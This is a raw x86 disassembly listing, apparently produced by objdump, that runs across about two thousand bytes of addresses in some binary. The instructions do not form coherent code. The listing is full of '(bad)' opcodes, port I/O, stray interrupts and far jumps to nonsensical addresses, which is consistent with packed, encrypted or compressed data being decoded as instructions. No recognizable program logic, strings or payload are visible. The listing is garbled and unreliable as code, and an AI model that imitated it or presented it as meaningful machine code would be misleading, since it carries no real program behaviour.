  41822c:	retf   0xb361
  41822f:	fwait
  418230:	ret    0x149e
  418233:	das    
  418234:	rcl    BYTE PTR [edx+0x4cbccf22],cl
  41823a:	inc    edi
  41823b:	ror    DWORD PTR [edi-0x5e15ed52],cl
  418241:	fstp   TBYTE PTR [ebp+0xccf1f14]
  418247:	retf   0x8651
  41824a:	rcr    DWORD PTR [ebx],1
  41824c:	pushf  
  41824d:	mov    ch,0xa0
  41824f:	fs std 
  418251:	mov    ds:0x8ea1343f,al
  418256:	mov    bl,0xce
  418258:	in     eax,0x79
  41825a:	sbb    dh,BYTE PTR [edi+0x64]
  41825d:	adc    BYTE PTR fs:[edx+0xf],ch
  418261:	outs   dx,DWORD PTR ds:[esi]
  418262:	dec    eax
  418263:	pop    ebx
  418264:	mov    dl,0x2d
  418266:	jl     0x4182a8
  418268:	(bad)  
  418269:	dec    edx
  41826a:	(bad)  
  41826b:	inc    eax
  41826c:	xchg   esi,eax
  41826d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41826e:	sbb    DWORD PTR [edi+ecx*2+0x44bdda24],esi
  418275:	mov    ah,0x99
  418277:	mov    dl,0xdb
  418279:	in     eax,dx
  41827a:	fdiv   DWORD PTR [edx]
  41827c:	inc    esp
  41827d:	adc    ah,dh
  41827f:	ror    BYTE PTR [ebp-0x2725b8fb],1
  418285:	bound  ebp,QWORD PTR [esi]
  418287:	pop    edx
  418288:	retf   0xb82b
  41828b:	sti    
  41828c:	jb     0x4182c4
  41828e:	loopne 0x4182e9
  418290:	mov    esi,0x648afbbd
  418295:	dec    edi
  418296:	aas    
  418297:	psrlq  mm5,QWORD PTR [ebx-0x11]
  41829b:	std    
  41829c:	sbb    dh,bl
  41829e:	lea    edi,[eax-0x25]
  4182a1:	ds inc ecx
  4182a3:	scas   al,BYTE PTR es:[edi]
  4182a4:	jo     0x4182f8
  4182a6:	in     al,0x7d
  4182a8:	push   ds
  4182a9:	std    
  4182aa:	cdq    
  4182ab:	cmp    DWORD PTR [edi-0x23],esi
  4182ae:	sbb    edx,ebp
  4182b0:	xchg   esi,eax
  4182b1:	addr16 pop edx
  4182b3:	shr    DWORD PTR [ebp-0x63],1
  4182b6:	jns    0x418280
  4182b8:	push   edx
  4182b9:	int3   
  4182ba:	stos   DWORD PTR es:[edi],eax
  4182bb:	push   edi
  4182bc:	cmp    edx,DWORD PTR [esi+eax*8+0x518bfe99]
  4182c3:	adc    BYTE PTR [ecx],dh
  4182c5:	fld    TBYTE PTR ds:0x8895b596
  4182cb:	or     cl,BYTE PTR [edx]
  4182cd:	test   eax,0x13b8b12c
  4182d2:	fstp   DWORD PTR [esi+ecx*4+0x1e1a5d72]
  4182d9:	ret    
  4182da:	aas    
  4182db:	int3   
  4182dc:	fmul   DWORD PTR [ecx-0xc4f9f60]
  4182e2:	aas    
  4182e3:	les    esp,FWORD PTR [edi+eax*4+0x7e6d7461]
  4182ea:	push   0x37
  4182ec:	and    ecx,DWORD PTR [edx]
  4182ee:	sar    DWORD PTR [eax+0xa59f844],cl
  4182f4:	repnz mov BYTE PTR [esi-0x6aaa11e3],bh
  4182fb:	cs pop ss
  4182fd:	cmp    ch,cl
  4182ff:	and    eax,0x8f2abf94
  418304:	fdiv   QWORD PTR [esi]
  418306:	mov    ecx,0x65ce798e
  41830b:	push   ss
  41830c:	or     edx,DWORD PTR [esi]
  41830e:	nop
  41830f:	jg     0x4182b0
  418311:	adc    DWORD PTR [ecx+0x5c5f4210],edi
  418317:	stos   DWORD PTR es:[edi],eax
  418318:	jge    0x41833d
  41831a:	int    0xd4
  41831c:	dec    ebx
  41831d:	dec    DWORD PTR [edx-0x4993f2]
  418323:	daa    
  418324:	(bad)  
  418326:	stos   BYTE PTR es:[edi],al
  418327:	sbb    eax,0x368ef690
  41832c:	sub    al,0xc7
  41832e:	test   dl,bh
  418330:	fidiv  DWORD PTR [esi+0x5c5f31c3]
  418336:	add    bl,dh
  418338:	pop    ecx
  418339:	cdq    
  41833a:	int3   
  41833b:	push   edx
  41833c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41833d:	sbb    DWORD PTR [esp+edx*8],0x3f663ede
  418344:	mov    ebx,0x8612703
  418349:	int    0x1
  41834b:	iret   
  41834c:	outs   dx,BYTE PTR ds:[esi]
  41834d:	or     al,0xfb
  41834f:	imul   eax,DWORD PTR [ebx],0x414e2aa5
  418355:	dec    ebx
  418356:	inc    ebx
  418357:	sbb    esi,edx
  418359:	mov    bh,0x84
  41835b:	mov    dh,0x29
  41835d:	xor    eax,0x75475200
  418362:	add    al,0x56
  418364:	jmp    0xc4e39f2
  418369:	mov    ah,0x57
  41836b:	ja     0x418386
  41836d:	pop    ss
  41836e:	sbb    eax,0x6bab3772
  418373:	adc    DWORD PTR [ecx+0x4e],ebp
  418376:	inc    ecx
  418377:	(bad)  
  418378:	scas   eax,DWORD PTR es:[di]
  41837a:	jno    0x41833a
  41837c:	arpl   WORD PTR [edi+0x7278443f],bx
  418382:	xchg   edi,eax
  418383:	stos   BYTE PTR es:[edi],al
  418384:	imul   esp,DWORD PTR [ecx+0xa6d89ce],0xffffff8d
  41838b:	lea    edx,ds:[ebx]
  41838e:	xchg   edi,eax
  41838f:	sar    BYTE PTR [ebx-0x6877b89],0xb1
  418396:	jg     0x4183c3
  418398:	or     DWORD PTR [ebp-0x219eb290],0x23
  41839f:	js     0x4183b5
  4183a1:	std    
  4183a2:	loopne 0x418325
  4183a4:	in     eax,dx
  4183a5:	lds    edi,FWORD PTR [ebx]
  4183a7:	cmp    al,dh
  4183a9:	daa    
  4183aa:	dec    ebx
  4183ab:	cmp    al,BYTE PTR [ebp-0xf1d3457]
  4183b1:	int3   
  4183b2:	ror    bl,1
  4183b4:	adc    DWORD PTR [edx-0x1c84b87f],0xffffff99
  4183bb:	jmp    esp
  4183bd:	fisttp QWORD PTR [ebx]
  4183bf:	mov    dl,0x5
  4183c1:	stos   DWORD PTR es:[edi],eax
  4183c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183c3:	mov    edi,0x314a7d29
  4183c8:	mov    DWORD PTR [ebp-0x7e],esi
  4183cb:	push   cs
  4183cc:	push   esp
  4183cd:	fcmovu st,st(6)
  4183cf:	shrd   DWORD PTR [edi+0x2770cd68],esp,cl
  4183d6:	cmp    al,BYTE PTR [edi-0x52]
  4183d9:	xchg   ebp,eax
  4183da:	dec    ecx
  4183db:	xor    DWORD PTR [edi+0x56],ebp
  4183de:	pop    ds
  4183df:	fisub  WORD PTR [ebx+eax*1-0x53]
  4183e3:	jae    0x41845f
  4183e5:	in     al,0xb
  4183e7:	cmp    al,0xce
  4183e9:	or     edi,DWORD PTR [esi]
  4183eb:	fidiv  DWORD PTR [esi+0x792e08c1]
  4183f1:	es fs imul eax,ebp,0x307bcc20
  4183f9:	cs dec ecx
  4183fb:	ss repz jno 0x4183ad
  4183ff:	push   eax
  418400:	cld    
  418401:	nop
  418402:	xor    al,BYTE PTR [edi]
  418404:	enter  0x38c2,0xf2
  418408:	adc    eax,0xaed5d96f
  41840d:	outs   dx,DWORD PTR ds:[esi]
  41840e:	ret    
  41840f:	and    ebp,eax
  418411:	xor    bh,BYTE PTR ss:[ecx+edx*8+0x33]
  418416:	les    esi,FWORD PTR [ecx-0x4f89e874]
  41841c:	add    ebp,DWORD PTR [esi+0x286d76af]
  418422:	and    BYTE PTR [ecx],dh
  418424:	imul   eax,ecx,0xc2faa78e
  41842a:	das    
  41842b:	packuswb mm2,QWORD PTR [ebx+0x33]
  41842f:	fdivr  DWORD PTR [edi+0xd]
  418432:	mov    esp,0xcb6586f2
  418437:	out    0xb8,eax
  418439:	pop    edx
  41843a:	sar    BYTE PTR [ecx-0x4429de2c],0xf
  418441:	mov    esi,0x4fc720b1
  418446:	sbb    BYTE PTR [eax],ah
  418448:	into   
  418449:	inc    ebp
  41844a:	loop   0x4184ca
  41844c:	dec    ecx
  41844d:	pop    edi
  41844e:	cdq    
  41844f:	lods   eax,DWORD PTR ds:[esi]
  418450:	mov    dh,0x7d
  418452:	call   FWORD PTR [esi+ecx*2-0x1f0d26a8]
  418459:	mov    al,ds:0x5fd965b5
  41845e:	repz mov esi,0x8946a4d5
  418464:	in     eax,0x5d
  418466:	and    al,0xe4
  418468:	or     DWORD PTR [edx-0x67],0xe8f7c25a
  41846f:	imul   esp,DWORD PTR [bp+di+0x5084],0x57b4e5bb
  418478:	pushf  
  418479:	xchg   esi,eax
  41847a:	sub    eax,0xb24d2c80
  41847f:	or     DWORD PTR fs:[esi],ebp
  418482:	or     al,0xd7
  418484:	outs   dx,DWORD PTR ds:[esi]
  418485:	xor    eax,0xab810b9b
  41848a:	ret    0x6144
  41848d:	call   0xa639:0x1e90e5e5
  418494:	pop    ebp
  418495:	sbb    DWORD PTR [bx+0x3e],ebp
  418499:	add    DWORD PTR [edx+0x6fd41705],eax
  41849f:	iret   
  4184a0:	(bad)  
  4184a1:	xor    ch,BYTE PTR fs:0x2c06c40
  4184a8:	xor    ebp,0x24
  4184ab:	xchg   edi,eax
  4184ac:	test   cl,0x4f
  4184af:	rcr    BYTE PTR [esp+edi*2-0x3f4387b5],0xa2
  4184b7:	sbb    DWORD PTR [ecx],edx
  4184b9:	mov    BYTE PTR [ecx+0x27ae4bfa],dl
  4184bf:	push   edx
  4184c0:	push   ebp
  4184c1:	mov    ds:0x7a0b5657,eax
  4184c6:	cmp    eax,0x99330a25
  4184cb:	cmc    
  4184cc:	lods   eax,DWORD PTR ds:[esi]
  4184cd:	jo     0x418451
  4184cf:	sbb    cl,BYTE PTR [edi+0x68]
  4184d2:	inc    edi
  4184d3:	push   eax
  4184d4:	outs   dx,DWORD PTR ds:[esi]
  4184d5:	inc    esp
  4184d6:	adc    eax,0xdf343136
  4184db:	pusha  
  4184dc:	inc    esi
  4184dd:	cdq    
  4184de:	loopne 0x418466
  4184e0:	stos   BYTE PTR es:[edi],al
  4184e1:	callw  0x5a66
  4184e5:	or     DWORD PTR gs:[eax+0x18],ecx
  4184e9:	cmp    eax,0x5516b7
  4184ee:	push   0xffffffdb
  4184f0:	mov    eax,0x119d77a1
  4184f5:	xchg   ebp,eax
  4184f6:	inc    esp
  4184f7:	pusha  
  4184f8:	push   0xb868db73
  4184fd:	retf   
  4184fe:	sbb    DWORD PTR [edx+0x1e],ecx
  418501:	test   DWORD PTR [ecx+edx*2-0x71884b5b],edi
  418508:	leave  
  418509:	adc    DWORD PTR [ebx],0x45
  41850c:	xor    cl,BYTE PTR [edi+0x725489ac]
  418512:	mov    edi,DWORD PTR [eax-0x58f23185]
  418518:	shr    BYTE PTR [edi+0x2c],1
  41851b:	retf   
  41851c:	inc    edx
  41851d:	int3   
  41851e:	jl     0x4184ea
  418520:	inc    esi
  418521:	push   esi
  418522:	icebp  
  418523:	xchg   ebx,eax
  418524:	and    eax,0x77760774
  418529:	mov    es,ecx
  41852b:	adc    al,0x74
  41852d:	jl     0x4184c7
  41852f:	popa   
  418530:	stc    
  418531:	and    cl,BYTE PTR [edi+esi*8]
  418534:	stos   BYTE PTR es:[edi],al
  418535:	shl    BYTE PTR [edx-0x7a],cl
  418538:	hlt    
  418539:	push   0x3d
  41853b:	sub    al,0x71
  41853d:	xor    eax,DWORD PTR [edx-0x26]
  418540:	out    dx,al
  418541:	jle    0x418597
  418543:	fild   DWORD PTR [esi-0xa]
  418546:	mov    es,WORD PTR [ebp-0xd868ed8]
  41854c:	sahf   
  41854d:	adc    DWORD PTR [edx-0x69],0x787801ad
  418554:	push   ebx
  418555:	rol    BYTE PTR [ebp-0x1fabb13b],1
  41855b:	pushf  
  41855c:	jl     0x41857d
  41855e:	ss push es
  418560:	lahf   
  418561:	add    eax,edx
  418563:	cli    
  418564:	push   cs
  418565:	cmp    edi,ebp
  418567:	push   eax
  418568:	sti    
  418569:	mov    eax,0xdebdd8b3
  41856e:	push   DWORD PTR [ecx+eax*8]
  418571:	dec    ebx
  418572:	ins    BYTE PTR es:[edi],dx
  418573:	retf   
  418574:	sbb    dh,BYTE PTR [esi+esi*4+0x1908a2f1]
  41857b:	ret    
  41857c:	pop    esi
  41857d:	jnp    0x418589
  41857f:	inc    esp
  418580:	ins    BYTE PTR es:[edi],dx
  418581:	pop    edx
  418582:	out    0x11,eax
  418584:	mov    esi,0xc9f05f32
  418589:	loope  0x4185ca
  41858b:	adc    esp,DWORD PTR [eax]
  41858d:	imul   eax,DWORD PTR [ecx+0x25b59910],0xabab4665
  418597:	or     al,0xdc
  418599:	js     0x41860f
  41859b:	cs in  eax,dx
  41859d:	ins    DWORD PTR es:[edi],dx
  41859e:	sub    eax,0x82e92677
  4185a3:	jecxz  0x418580
  4185a5:	dec    eax
  4185a6:	adc    DWORD PTR [ecx],0x129e3c7a
  4185ac:	mov    ds:0xa12ee8d0,eax
  4185b1:	sub    al,0xc9
  4185b3:	dec    esi
  4185b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185b5:	push   es
  4185b6:	inc    esp
  4185b7:	ror    edx,1
  4185b9:	mov    eax,0x31e16f6e
  4185be:	or     eax,0x2d4d9c09
  4185c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c4:	adc    esi,edi
  4185c6:	sbb    ecx,DWORD PTR [ebx]
  4185c8:	das    
  4185c9:	int3   
  4185ca:	fmul   QWORD PTR [edi]
  4185cc:	or     cl,BYTE PTR [eax+0x4e634f0]
  4185d2:	mov    esi,0xafde2e54
  4185d7:	ds cwde 
  4185d9:	mov    es,WORD PTR [eax-0x184f8649]
  4185df:	daa    
  4185e0:	stc    
  4185e1:	inc    eax
  4185e3:	stc    
  4185e4:	pop    ss
  4185e5:	(bad)  
  4185e6:	iret   
  4185e7:	fst    QWORD PTR [esp+edx*8+0x1654570e]
  4185ee:	cdq    
  4185ef:	dec    esi
  4185f0:	test   BYTE PTR [ecx-0x2d],dl
  4185f3:	sbb    DWORD PTR [edi-0x2d9660cb],ebx
  4185f9:	cli    
  4185fa:	jb     0x418651
  4185fc:	cdq    
  4185fd:	leave  
  4185fe:	in     eax,0x68
  418600:	ss and al,0xcb
  418603:	out    0x6b,al
  418605:	scas   eax,DWORD PTR es:[edi]
  418606:	std    
  418607:	push   0xfffffffa
  418609:	mov    ebp,0xc42ae33c
  41860e:	imul   edx,DWORD PTR ds:0x31e614be,0x5cf02991
  418618:	fsubr  QWORD PTR [ebx]
  41861a:	sub    al,0xef
  41861c:	sub    cl,cl
  41861e:	jne    0x4185cf
  418620:	enter  0xad80,0xc
  418624:	(bad)  
  418625:	in     eax,dx
  418626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418627:	retf   0x5ace
  41862a:	push   ecx
  41862b:	gs sbb dh,cl
  41862e:	cmp    eax,0xa6074904
  418633:	jg     0x418608
  418635:	das    
  418636:	push   edx
  418637:	inc    ebx
  418638:	jne    0x41861d
  41863a:	push   ecx
  41863b:	lods   eax,DWORD PTR ds:[esi]
  41863c:	push   eax
  41863d:	aad    0x6a
  41863f:	(bad)  
  418640:	imul   esp,DWORD PTR [edx+0x1a],0xb772e170
  418647:	repnz std 
  418649:	js     0x4185f8
  41864b:	cmp    DWORD PTR ds:0x83965bc4,ebp
  418651:	sub    DWORD PTR [eax+ecx*4],esi
  418654:	pop    esi
  418655:	xchg   ebx,eax
  418656:	pop    esp
  418657:	mov    eax,0x7902340f
  41865c:	cmc    
  41865d:	loope  0x418620
  41865f:	aad    0x5d
  418661:	xchg   BYTE PTR [ecx],ch
  418663:	out    dx,al
  418664:	(bad)  
  418665:	jno    0x4186a2
  418667:	(bad)  
  418668:	or     edx,DWORD PTR [edx+0xa]
  41866b:	pop    edi
  41866c:	pop    ss
  41866d:	ds iret 
  41866f:	pushf  
  418670:	outs   dx,DWORD PTR ds:[esi]
  418671:	les    esp,FWORD PTR ds:0x5972b53d
  418677:	sbb    dh,cl
  418679:	mov    ecx,0x188faa47
  41867e:	fisttp DWORD PTR [eax]
  418680:	or     eax,0x2bf95724
  418685:	outs   dx,DWORD PTR ds:[esi]
  418686:	test   DWORD PTR [ebp-0x2517b236],eax
  41868c:	loop   0x41866d
  41868e:	int3   
  41868f:	test   eax,0xdb69b7e
  418694:	and    DWORD PTR [ebp+0x37],ecx
  418697:	add    eax,0xf8ffbc46
  41869c:	xor    eax,eax
  41869e:	sub    DWORD PTR [edx],ecx
  4186a0:	pushf  
  4186a1:	leave  
  4186a2:	dec    ecx
  4186a3:	cdq    
  4186a4:	stos   DWORD PTR es:[edi],eax
  4186a5:	lea    ebx,[esi-0x61b73b06]
  4186ab:	out    0x92,al
  4186ad:	js     0x408fea8
  4186b3:	ins    BYTE PTR es:[edi],dx
  4186b4:	push   eax
  4186b5:	aam    0x22
  4186b7:	pushf  
  4186b8:	int    0xb6
  4186ba:	mov    ebx,0xfad42e4b
  4186bf:	fcom   st(7)
  4186c1:	test   eax,0x8cb6e220
  4186c6:	xchg   esp,eax
  4186c7:	mov    ecx,0x373ee0e5
  4186cc:	fisttp WORD PTR [ebp-0x6c3f4148]
  4186d2:	imul   edx,DWORD PTR [edi-0x2785bfbf],0x3f
  4186d9:	dec    esp
  4186da:	mov    BYTE PTR [eax-0x7a6abdc8],cl
  4186e0:	ss (bad) 
  4186e2:	pop    ebx
  4186e3:	aas    
  4186e4:	inc    ebp
  4186e5:	pop    DWORD PTR [esi]
  4186e7:	fild   QWORD PTR [ebx+0x3d7a0804]
  4186ed:	add    eax,0xe9657769
  4186f2:	push   esi
  4186f3:	in     al,0xd4
  4186f5:	inc    ebx
  4186f6:	mov    BYTE PTR [ecx-0x7f2842da],ah
  4186fc:	not    BYTE PTR [ebx+0x26]
  4186ff:	sbb    al,0xec
  418701:	cmp    DWORD PTR [edi-0x4b518690],ecx
  418707:	shl    BYTE PTR [ebp+eax*1-0x3f],1
  41870b:	sti    
  41870c:	(bad)  
  41870d:	aad    0x39
  41870f:	add    al,0x60
  418711:	call   esi
  418713:	jbe    0x418744
  418715:	and    eax,0xa5c6b3ce
  41871a:	jb     0x4186b0
  41871c:	(bad)  
  41871e:	clc    
  41871f:	cmp    al,0xa2
  418721:	mov    eax,0xadcda2cd
  418726:	nop    DWORD PTR [edx]
  418729:	pusha  
  41872a:	xchg   DWORD PTR [esi+0x62],ebx
  41872d:	sbb    bl,BYTE PTR [edi-0x16]
  418730:	inc    ebx
  418731:	mov    ds:0x1d0cda96,al
  418736:	dec    ebp
  418737:	fdiv   QWORD PTR [eax+0x7414a71d]
  41873d:	xor    al,0x14
  41873f:	mov    eax,ds:0xd3d895c8
  418744:	data16 ins BYTE PTR es:[edi],dx
  418746:	push   esp
  418747:	mov    cl,0x96
  418749:	iret   
  41874a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41874b:	mov    bl,0xff
  41874d:	sahf   
  41874e:	pop    edi
  41874f:	push   ecx
  418750:	or     esi,ebx
  418752:	clc    
  418753:	mov    eax,ds:0x280f2191
  418758:	jmp    0x250398ae
  41875d:	lods   al,BYTE PTR ds:[esi]
  41875e:	aam    0x87
  418760:	test   DWORD PTR [edi-0x801cb4],eax
  418766:	push   es
  418767:	jmp    FWORD PTR ds:0x3e0c3357
  41876d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876e:	inc    ebx
  41876f:	cmp    ch,0xda
  418772:	mov    edi,0x4d750fd3
  418777:	jecxz  0x418744
  418779:	(bad)  
  41877b:	int    0xd9
  41877d:	psllw  mm5,QWORD PTR [esp+eax*1+0x4c]
  418782:	or     ecx,edx
  418784:	or     ecx,DWORD PTR [ebp+0x4c]
  418787:	fistp  DWORD PTR fs:[eax]
  41878a:	mov    bl,0xfd
  41878c:	cmp    DWORD PTR [edx*4+0x7ceaa3b],0x55c648f2
  418797:	ror    DWORD PTR ds:0x61fb6f48,cl
  41879d:	(bad)  
  41879e:	mov    bh,0xca
  4187a0:	mov    ah,0x2f
  4187a2:	fs retf 0x5301
  4187a6:	jge    0x418744
  4187a8:	leave  
  4187a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187aa:	sub    DWORD PTR [ebp-0x4e3cff40],ebx
  4187b0:	jb     0x41875b
  4187b2:	lea    ebp,[ecx+0x78]
  4187b5:	outs   dx,BYTE PTR ds:[esi]
  4187b6:	xchg   DWORD PTR [eax-0x1],edx
  4187b9:	mov    ebx,DWORD PTR [eax]
  4187bb:	cdq    
  4187bc:	jo     0x418818
  4187be:	and    DWORD PTR [ebx],esi
  4187c0:	cmp    al,0xb4
  4187c2:	and    eax,0x1b90e9be
  4187c7:	ror    bh,0x91
  4187ca:	adc    DWORD PTR [ecx-0x58],ebx
  4187cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ce:	lods   eax,DWORD PTR ds:[esi]
  4187cf:	outs   dx,DWORD PTR ds:[esi]
  4187d0:	adc    DWORD PTR [eax+esi*1],0xd1c03af0
  4187d7:	inc    esp
  4187d8:	pop    ss
  4187d9:	xlat   BYTE PTR ds:[ebx]
  4187da:	fcom   st(7)
  4187dc:	sbb    eax,0xd426327f
  4187e1:	pop    esi
  4187e2:	test   esi,ecx
  4187e4:	fsubr  DWORD PTR [edi+0x450bfd0c]
  4187ea:	imul   eax,ebx,0x58
  4187ed:	hlt    
  4187ee:	cmp    DWORD PTR [ebp-0x2c02c7b],esi
  4187f4:	iret   
  4187f5:	stos   BYTE PTR es:[edi],al
  4187f6:	adc    eax,0xde577db7
  4187fb:	push   ecx
  4187fc:	cmp    al,0xbe
  4187fe:	mov    dl,0x76
  418800:	inc    ecx
  418801:	jp     0x418881
  418803:	inc    esp
  418804:	sub    cl,BYTE PTR [ecx-0x69cf2ae4]
  41880a:	neg    BYTE PTR [esi+0x22]
  41880d:	cs pop eax
  41880f:	clc    
  418810:	jne    0x4187b5
  418812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418813:	push   edi
  418814:	jo     0x418854
  418816:	mov    edx,0x1b9752e
  41881b:	(bad)  
  41881d:	in     eax,0xf7
  41881f:	sahf   
  418820:	dec    esi
  418821:	test   al,0xcd
  418824:	adc    DWORD PTR [ebx+edi*2-0x4b],esi
  418828:	ins    DWORD PTR es:[edi],dx
  418829:	and    eax,0x6446adb2
  41882e:	or     edi,DWORD PTR [edi+0x58]
  418831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418832:	cdq    
  418833:	fidiv  DWORD PTR [ebx+0x20]
  418836:	and    DWORD PTR [ecx+0x64],esp
  418839:	jb     0x418866
  41883b:	sub    BYTE PTR [ebx],cl
  41883d:	and    DWORD PTR [eax],ebx
  41883f:	jbe    0x418802
  418841:	popf   
  418842:	cli    
  418843:	push   ebp
  418844:	pusha  
  418845:	add    BYTE PTR [eax-0x6d7fc8c1],ah
  41884b:	aas    
  41884c:	adc    bh,BYTE PTR [ecx-0x1fd1b687]
  418852:	popa   
  418853:	sbb    DWORD PTR [ebp+0x4f00bbb2],ebx
  418859:	or     bh,bl
  41885b:	out    dx,al
  41885c:	fldenv [ecx-0x26dcfed3]
  418862:	mov    cl,0x37
  418864:	xor    DWORD PTR [ecx+0x2c582381],0xb77e4d5b
  41886e:	push   eax
  41886f:	daa    
  418870:	popa   
  418871:	popf   
  418872:	aas    
  418873:	mov    ebx,0x2bc2c6d9
  418878:	jne    0x4188c6
  41887a:	ds dec esp
  41887c:	xor    esi,DWORD PTR [ecx+0x5daf29af]
  418882:	xchg   ebp,eax
  418883:	scas   al,BYTE PTR es:[di]
  418885:	data16 aaa 
  418887:	fwait
  418888:	jno    0x418893
  41888a:	popf   
  41888b:	out    0x7f,eax
  41888d:	jmp    0xf139:0xe2fc32d2
  418894:	sub    DWORD PTR [ecx-0x56],ebp
  418897:	jl     0x418829
  418899:	out    dx,eax
  41889a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41889b:	cdq    
  41889c:	push   edi
  41889d:	hlt    
  41889e:	addr16 popf 
  4188a0:	xchg   edx,eax
  4188a1:	in     al,dx
  4188a2:	pop    ds
  4188a3:	ficom  WORD PTR [eax+0xf]
  4188a6:	jbe    0x4188c0
  4188a8:	mov    dh,0xf
  4188aa:	sahf   
  4188ab:	add    dl,BYTE PTR [ebx+0x4748dbca]
  4188b1:	pop    edx
  4188b2:	and    BYTE PTR [ebx+0x7144bca1],cl
  4188b8:	or     bh,BYTE PTR [eax]
  4188ba:	cmp    esi,DWORD PTR [ebx+0x5c]
  4188bd:	call   FWORD PTR [ebx-0x151fe864]
  4188c3:	aaa    
  4188c4:	pop    esi
  4188c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c6:	es inc esp
  4188c8:	outs   dx,DWORD PTR ds:[esi]
  4188c9:	mov    dl,0x20
  4188cb:	xchg   esi,eax
  4188cc:	cli    
  4188cd:	out    0x16,eax
  4188cf:	imul   esi,DWORD PTR [ebp+eax*8-0x35],0xcf991f48
  4188d7:	cdq    
  4188d8:	jbe    0x418881
  4188da:	aaa    
  4188db:	jle    0x418902
  4188dd:	push   ecx
  4188de:	add    al,0x49
  4188e0:	xchg   esi,eax
  4188e1:	loop   0x4188c5
  4188e3:	jg     0x41893d
  4188e5:	adc    dl,BYTE PTR [ecx+0x64]
  4188e8:	ror    BYTE PTR [ecx],1
  4188ea:	shr    BYTE PTR [ebx+0x5a],cl
  4188ed:	outs   dx,DWORD PTR ds:[esi]
  4188ee:	pushf  
  4188ef:	mov    ch,0x58
  4188f1:	inc    edx
  4188f2:	or     al,0x1f
  4188f4:	mov    DWORD PTR [edx+0x60],ebp
  4188f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f8:	ret    0x972
  4188fb:	shl    DWORD PTR [edi-0x68],0x1e
  4188ff:	inc    esi
  418900:	je     0x41894a
  418902:	cmp    al,0xdc
  418904:	dec    ecx
  418905:	fst    QWORD PTR [ebp+edi*1+0x48]
  418909:	ret    0x8c39
  41890c:	mov    es,WORD PTR [edx-0x44]
  41890f:	(bad)  
  418910:	jge    0x41892c
  418912:	pmovmskb eax,mm1
  418915:	mov    ebx,0x5d8fffa
  41891a:	retf   0xb129
  41891d:	(bad)  
  41891e:	push   ds
  41891f:	or     dl,ah
  418921:	mov    esi,0x6c132fa2
  418926:	adc    esp,edx
  418928:	leave  
  418929:	retf   0x4c96
  41892c:	jns    0x418950
  41892e:	xor    edi,ecx
  418930:	jno    0x41895f
  418932:	sub    cl,BYTE PTR [ebp+0x26]
  418935:	je     0x4189ae
  418937:	shl    BYTE PTR [eax+0x7c530ddd],0x9b
  41893e:	out    dx,al
  41893f:	push   esi
  418940:	fcom   QWORD PTR [ecx]
  418942:	sar    BYTE PTR [eax+0x779838e9],0x78
  418949:	add    DWORD PTR [ebp-0x4ad146a8],esp
  41894f:	dec    ebx
  418950:	out    dx,eax
  418951:	fnsave [eax]
  418953:	jae    0x418990
  418955:	call   0xcaa0:0xddeb9de7
  41895c:	ins    DWORD PTR es:[edi],dx
  41895d:	jmp    0x418941
  41895f:	addr16 int 0x36
  418962:	into   
  418963:	xchg   edi,eax
  418964:	cwde   
  418965:	inc    esp
  418966:	jp     0x418912
  418968:	sbb    eax,0x9e9e64e
  41896d:	inc    esp
  41896e:	sub    esp,DWORD PTR [ecx+0xd2097d2]
  418974:	(bad)  
  418976:	out    0xef,al
  418978:	nop
  418979:	xor    al,0xe5
  41897b:	mov    al,BYTE PTR [ebx-0x58]
  41897e:	rcl    BYTE PTR [ecx],cl
  418980:	push   ecx
  418981:	iret   
  418982:	mov    ds:0x41e10d3f,al
  418987:	lds    eax,FWORD PTR [esi+0x26b82d29]
  41898d:	xchg   esp,eax
  41898e:	cli    
  41898f:	test   al,0xec
  418991:	sub    al,0x93
  418993:	stos   BYTE PTR es:[edi],al
  418994:	pop    es
  418995:	imul   edx,DWORD PTR [edi-0x49],0xffffffba
  418999:	add    DWORD PTR [ecx],ebp
  41899b:	cmp    al,BYTE PTR [ecx]
  41899d:	fimul  WORD PTR [ebx]
  41899f:	cmp    al,0xb2
  4189a1:	add    ebx,DWORD PTR [edi+0x1b7eadae]
  4189a7:	add    ecx,DWORD PTR [esi-0x43]
  4189aa:	mov    ds:0x7dfe2efa,al
  4189af:	iret   
  4189b0:	loopne 0x418a17
  4189b2:	mov    ch,0x38
  4189b4:	cli    
  4189b5:	test   ebp,eax
  4189b7:	imul   BYTE PTR [ebp-0x636d6ebb]
  4189bd:	push   es
  4189be:	or     al,0x97
  4189c0:	or     cl,bl
  4189c2:	imul   ecx,edi,0x68ed526
  4189c8:	jmp    FWORD PTR [ecx-0x52]
  4189cb:	pop    ecx
  4189cc:	mov    ds:0xc17e5480,eax
  4189d1:	rol    ebx,0x28
  4189d4:	xor    al,0xa6
  4189d6:	xor    DWORD PTR [esp+esi*8-0x34],edi
  4189da:	fucomip st,st(4)
  4189dc:	adc    eax,0x55166ac4
  4189e1:	fld    QWORD PTR ds:0x3eaa14b2
  4189e7:	rol    DWORD PTR [esi+0x1efa043a],1
  4189ed:	mov    gs,WORD PTR [ebp-0x1804632d]
  4189f3:	call   0xa4bd:0x9b62eb1a
  4189fa:	pop    edx
  4189fb:	inc    edi
  4189fc:	sbb    al,0x8a
  4189fe:	jp     0x4189e3
  418a00:	and    eax,0xabd84646
  418a05:	aas    
  418a06:	sub    DWORD PTR [esi],ebx
  418a08:	lods   eax,DWORD PTR ds:[esi]
  418a09:	push   es
  418a0a:	out    dx,eax
  418a0b:	out    dx,al
  418a0c:	popf   
  418a0d:	cmc    
  418a0e:	sahf   
  418a0f:	(bad)  
  418a10:	in     eax,dx
  418a11:	xchg   BYTE PTR [edx+esi*4],dl
  418a14:	out    dx,al
  418a15:	nop
